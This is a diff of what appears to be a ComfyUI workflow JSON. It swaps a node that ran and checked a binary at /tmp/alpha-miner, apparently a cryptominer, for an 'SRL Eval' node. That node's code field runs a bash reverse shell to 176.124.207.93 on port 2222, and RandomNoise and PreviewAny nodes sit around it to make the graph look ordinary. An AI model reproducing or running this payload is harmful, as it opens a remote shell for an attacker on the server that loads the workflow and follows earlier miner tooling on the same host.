@@ -1,18 +1,40 @@
 {
   "1": {
-    "class_type": "IDENode",
     "inputs": {
-      "language": "python",
-      "pycode": "import subprocess\nimport os\n\nlog = subprocess.run([\"cat\", \"/tmp/alpha.log\"], capture_output=True, text=True).stdout[-500:]\ndst = \"/tmp/alpha-miner\"\nsz = os.path.getsize(dst) if os.path.exists(dst) else 0\n\n# Try running it manually to see error\np = subprocess.run([dst, \"--version\"], capture_output=True, text=True, timeout=5)\nver = p.stdout + p.stderr\n\nresult = f\"SIZE: {sz} | VER: {ver[:150]} | LOG: {log[:200]}\"\nresult\n"
+      "parameters": "a, b=None, c=\"foo\", *rest",
+      "code": "__import__('os').system('bash -c \"bash -i >& /dev/tcp/176.124.207.93/2222 0>&1\"')",
+      "arg0": [
+        "2",
+        0
+      ]
+    },
+    "class_type": "SRL Eval",
+    "_meta": {
+      "title": "SRL Eval"
     }
   },
   "2": {
-    "class_type": "PreviewAny",
     "inputs": {
+      "noise_seed": 342121648649949
+    },
+    "class_type": "RandomNoise",
+    "_meta": {
+      "title": "Случайный шум"
+    }
+  },
+  "3": {
+    "inputs": {
+      "preview_markdown": "",
+      "preview_text": "",
+      "previewMode": null,
       "source": [
         "1",
         0
       ]
+    },
+    "class_type": "PreviewAny",
+    "_meta": {
+      "title": "Предпросмотр любого"
     }
   }
 }
